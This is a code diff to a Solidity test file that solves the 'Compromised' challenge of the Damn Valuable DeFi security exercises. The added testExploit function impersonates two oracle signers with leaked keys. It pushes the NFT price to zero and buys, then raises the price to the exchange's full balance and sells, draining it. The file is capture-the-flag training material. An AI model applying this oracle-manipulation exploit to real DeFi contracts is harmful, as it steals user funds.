@@ -11,6 +11,7 @@ import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 contract Compromised is Test {
     uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
     uint256 internal constant INITIAL_NFT_PRICE = 999e18;
+    address[] internal sources = new address[](3);
 
     Exchange internal exchange;
     TrustfulOracle internal trustfulOracle;
@@ -19,8 +20,6 @@ contract Compromised is Test {
     address payable internal attacker;
 
     function setUp() public {
-        address[] memory sources = new address[](3);
-
         sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
         sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
         sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
@@ -72,11 +71,39 @@ contract Compromised is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    event log(uint256);
+
     function testExploit() public {
+        // private keys are in server
         /**
          * EXPLOIT START *
          */
 
+        // make cheap and buy
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT", 0);
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        // buy and approve
+        vm.startPrank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+        damnValuableNFT.approve(address(exchange), tokenId);
+        vm.stopPrank();
+
+        // make expensive and sell
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(attacker);
+        exchange.sellOne(tokenId);
+
+        // return to intial price
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         /**
          * EXPLOIT END *
          */
